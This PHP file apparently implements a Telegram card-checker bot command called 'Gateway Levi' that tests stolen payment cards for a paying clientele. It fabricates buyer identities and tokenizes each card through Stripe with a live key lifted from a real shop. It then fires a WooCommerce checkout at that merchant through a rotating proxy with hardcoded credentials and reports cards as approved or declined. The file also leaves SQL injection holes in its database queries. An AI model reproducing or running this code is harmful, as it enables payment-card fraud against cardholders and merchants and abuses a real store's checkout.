<?php
require_once '/home/alvcarr230/www/project/data/data.php';
list($cmd) = explode(" ", $text);
if($cmd == "/le" or $cmd == ".le" or $cmd == "!le" or $cmd == "?le" or $cmd == "#le" or $cmd == ":le" or $cmd == ",le"){ 
// A part for gatecmd clearance
   $gatecmd = 'le';

    $lista = explode(" ", $text)[1];
    
//-------------[ MYSQL CALL PART] ----_-----//

    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$SQL);
    $raw = mysqli_fetch_assoc($cs);
    $planexpiry = $raw['planexpiry'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='$gatecmd'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $gatec = $raw['gatecmd'];
     mysqli_close(mysqlcon());


    $sql = "SELECT * FROM gateway WHERE gatecmd='le'";
        $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $status = $raw['status'];
     mysqli_close(mysqlcon());

    
    $sql = "SELECT * FROM administrar WHERE id='$user_id'";
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $plan = $raw['plan'];
     mysqli_close(mysqlcon());
    

$sql = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $cs = mysqli_query(mysqlcon(),$sql);
    $raw = mysqli_fetch_assoc($cs);
    $chats = $raw['chats'];
    $now = time();
    
    /* This part for condition of gateways and some others*/
    
    if($status == "OFF"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌ ", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        SendMessage($content);
        exit();
    }
    
    

      if ($planexpiry < $now && $planexpiry == 0) {
    }
elseif ($planexpiry < $now && $plan != "Free User") {
    
    $sql = "UPDATE `administrar` SET `plan` = 'Free User' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    
    $sql = "UPDATE `administrar` SET `planexpiry` = '0' WHERE `administrar`.`id` = '$user_id';";
    $result = mysqli_query(mysqlcon(), $sql);
    mysqli_close(mysqlcon());
    $content = ['chat_id' => $chat_id, 'text' => "$premium_expired", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }
    
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "$group_not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{}

    $SQL = "SELECT * FROM `administrar` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "$not_registered", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    // if($plan == "Free User"){
    //     $content = ['chat_id' => $chat_id, 'text' => "$not_allowed", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //         $m1  = SendMessage($content);
    //         exit();
    // }
    // else{} 
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "<code>Gateway: Levi 🍃</code>
<code>𝖥𝗈𝗋𝗆𝖺𝗍: <i>cc|mm|yy|cvv</i></code>
<code>Enter a valid card</code>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);

    if($mes == "01"){
        $sub_mes = "1";
    }elseif($mes == "02"){
        $sub_mes = "2";
    }elseif($mes == "03"){
        $sub_mes = "3";
    }elseif($mes == "04"){
        $sub_mes = "4";
    }elseif($mes == "05"){
        $sub_mes = "5";
    }elseif($mes == "06"){
        $sub_mes = "6";
    }elseif($mes == "07"){
        $sub_mes = "7";
    }elseif($mes == "08"){
        $sub_mes = "8";
    }elseif($mes == "09"){
        $sub_mes = "9";
    }elseif($mes == "10"){
        $sub_mes = "10";
    }elseif($mes == "11"){
        $sub_mes = "11";
    }elseif($mes == "12"){
        $sub_mes = "12";
    }
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, -8);
$cc3 = substr($cc, 8, -4);
$cc4 = substr($cc, -4);

        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `administrar` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        
   $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $antispam2 = $RAW['antispam2'];
     $time =   str_replace('s','',$antispam2);
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < $time)
        {
            $TotalTime = $time - $TIMEAC;
            if($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>[ANTISPAM] Try again after $TotalTime's</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }


        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE administrar SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[ 💳$lista ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
      $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];

$starttime = microtime(true);
$mytime = 'time1';

//==================[BIN LOOK-UP]======================//
$url = 'https://projectslost.xyz/bin/?bin='.$bin.'';
$fim = json_decode(file_get_contents($url), true);
$level = $fim["level"];
$type = $fim["type"];
$brand = $fim["brand"];
$country = $fim["country"]["name"];
$currency = $fim["country"]["currency"];
$bank = $fim['bank']["name"];
$bankphone = $fim['bank']["phone"];
$emoji = $fim["country"]["flag"];
$pais = $fim["country"]["ISO2"];
//==================[BIN LOOK-UP-END]======================//


# ------------ Ramdom User ------------ #

$name = ucfirst(str_shuffle('unodostrescuatro'));
$last = ucfirst(str_shuffle('cincoseissieteocho'));
$inc = ucfirst(str_shuffle('AmazonAppleas'));
$email = "sexolandia".substr(md5(uniqid()), 0, 8)."@gmail.com";
$street = "".rand(0000,9999)." Main Street";
$ph = array("682","346","246");
$ph1 = array_rand($ph);
$phh = $ph[$ph1];
$phone = "$phh".rand(0000000,9999999)."";
$st = array("AL","NY","CA","FL","WA");
$st1 = array_rand($st);
$statee = $st[$st1];
if ($statee == "NY"){
$state = "New York";
$zip = "10080";
$city = "New York";
}
elseif ($statee == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($statee == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($statee == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange Park";
}else{
$state = "California";
$zip = "90201";
$city = "Bell";
};
function getDatas($string, $start,$end){
    $uno = explode($start, $string);
    $dos = explode($end,$uno[1]);
    return $dos[0];
}

     
$content2 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - ? - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m2  = EditMessageText($content2);
        $m2i = $m2['result']['message_id'];


//$cookie = uniqid();

/*$content3 = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
$m3 = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];*/


 /*$content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];*/
        
        

#------------ R2 PAYPAL ------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.stripe.com/v1/payment_methods");
curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "zkjrckec-rotate:xdm35wsocy3o");
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com/';
$headers[] = 'referer: https://js.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Geho+Jesus&billing_details[address][city]=Garden+City&billing_details[address][country]=US&billing_details[address][line1]=1359+Redbud+Drive&billing_details[address][postal_code]=11530&billing_details[address][state]=NY&billing_details[email]='.$last.'%40gmail.com&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=6240b534-468d-4a22-b03c-ed31b9b9574c70da01&muid=5d438f8b-8dcd-48e0-b2c4-9b1c353786bfe8a0a1&sid=9029c18f-5123-435e-bd49-1218e230eaf1327901&payment_user_agent=stripe.js%2Fb411c741e%3B+stripe-js-v3%2Fb411c741e&time_on_page=91690&key=pk_live_51HtH82KdK25ZlNyPsyZjU3jMCoLocCBAmFK33BVtIpeQjGiNcHf2RBgRf7TFJm1N9bc87dNXfE5MlEtGrICeNgUF00BAoQNp6J&_stripe_account=acct_1HtH82KdK25ZlNyP&_stripe_version=2022-08-01');

$curl = curl_exec($ch);
$id = json_decode($curl)->id;
    
    $content3 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 -🟠 - ? ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $starttime</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m3  = EditMessageText($content3);
        $m3i = $m3['result']['message_id'];

if (!empty($id)) {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://odditiesforsale.com/?wc-ajax=checkout");
    curl_setopt($ch, CURLOPT_PROXY, "p.webshare.io:80");
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, "zkjrckec-rotate:xdm35wsocy3o");
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
    $headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
    $headers[] = 'origin: https://odditiesforsale.com';
    $headers[] = 'referer: https://odditiesforsale.com/checkout/';
    $headers[] = 'cookie: PHPSESSID=7e7e70bd8a0f53523546487bf3d30c82; _lscache_vary=fc05f9059fe8cb8ec7edb1490a2f657b; _gcl_au=1.1.1812942954.1667975143; _ga=GA1.1.1981451273.1667975143; se-recently-viewed-products=1569; __stripe_mid=5d438f8b-8dcd-48e0-b2c4-9b1c353786bfe8a0a1; __stripe_sid=9029c18f-5123-435e-bd49-1218e230eaf1327901; woocommerce_items_in_cart=1; wp_woocommerce_session_93de7ff9b062f1863096366d3e6c4eed=t_1816328e4ab05c2895a0ab0f2f4119%7C%7C1668147960%7C%7C1668144360%7C%7C6dfb1c5d4da7fa82ecb289bdae29d7fb; yith_wrvp_products_list=%7B%221667975160%22%3A1569%7D; _ga_2XZ2DT0E2Y=GS1.1.1667975142.1.1.1667975203.0.0.0; _drip_client_7365597=vid%253D0981704d36624fe4898896596759b24e%2526pageViews%253D5%2526sessionPageCount%253D5%2526lastVisitedAt%253D1667975203987%2526weeklySessionCount%253D1%2526lastSessionAt%253D1667975143633%2526form%255B219939%255D%255Bauto_open%255D%253D1667975173%2526form%255B219939%255D%255Bmanual_close%255D%253D1667975177; woocommerce_cart_hash=33933273d6b6cc26b696ff262ce0a0ba';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    //////////////

    curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Geho&billing_last_name=Jesus&billing_country=US&billing_address_1=1359+Redbud+Drive&billing_address_2=&billing_city=Garden+City&billing_state=NY&billing_postcode=11530&billing_email=gehonnieljesus%40gmail.com&account_username=&account_password=&shipping_first_name=&shipping_last_name=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=stripe_cc&stripe_cc_token_key='.$id.'&stripe_cc_payment_intent_key=&stripe_afterpay_token_key=&stripe_afterpay_payment_intent_key=&stripe_googlepay_token_key=&stripe_googlepay_payment_intent_key=&woocommerce-process-checkout-nonce=772183e792&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
   $curl2 = curl_exec($ch);
   $message = trim(strip_tags(getdata($curl2, '\n\t\t\t\t<\/span>\n\t\t\t\t','\t\t\t<\/div>\n\t\t<\/li>\n\t<\/ul>\n\n')));


}
                                      }
#------------ R2 PAYPAL ------------#

     $content4 = ['chat_id' => $chat_id, 'text' => "<b>[$]-Please wait</b>
<b>processing...[🟡 - 🟠 - 🟢 ]</b>
<b>-------------------------------------------------</b>
<b>⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» $time</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
$m4  = EditMessageText($content4);
        $m4i = $m4['result']['message_id'];

if (strpos($culr2, 'Thanks You') or strpos($result, 'thanks you') or strpos($result, 'Thanks you')) {
	$status = "Approved ✅";
        $message = "Approved";
}elseif (strpos($curl2, 'security code is incorrect')){
    $status = "Approved CCN ✅";
}elseif (strpos($curl2, 'insufficient funds') or strpos($result, 'Insufficient Funds')){
        $status = "Approved CVV ✅️";
}else{
	$status = "Declined ❌️";
}


 $contentf = ['chat_id' => $chat_id, 'text' => "<b>-----------『↯𝐌𝐊𝐙↯』-----------</b>
↳ Gateway Levi [🍃]
-----------------------------------------
⎆𝐂𝐂» <code>$lista</code>
⎆𝐒𝐭𝐚𝐭𝐮𝐬» [ <code>$status</code> ]
⎆𝐌𝐞𝐬𝐬𝐚𝐠𝐞» <code>$message</code>
-----------------------------------------
⎆𝐁𝐢𝐧» <code>$bin</code>
⎆𝐓𝐲𝐩𝐞» <code>$brand - $type - $level</code>
⎆𝐁𝐚𝐧𝐤» <code>$bank</code>
⎆𝐂𝐨𝐮𝐧𝐭𝐫𝐲» <code>$country - $pais - $emoji</code>
------------------------------------------
⎆𝙿𝚛𝚘𝚡𝚢» Live ✅
⎆𝚃𝚎𝚜𝚝 𝚝𝚒𝚖𝚎» <code><i>$time Seconds</i></code>
⎆𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲» @$username <code><b>[$plan]</b></code>
", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($contentf);
    }

/*GATEWAY ON, NO TOCAR NADA SI NO DEJARA DE FUNCIONAR*/
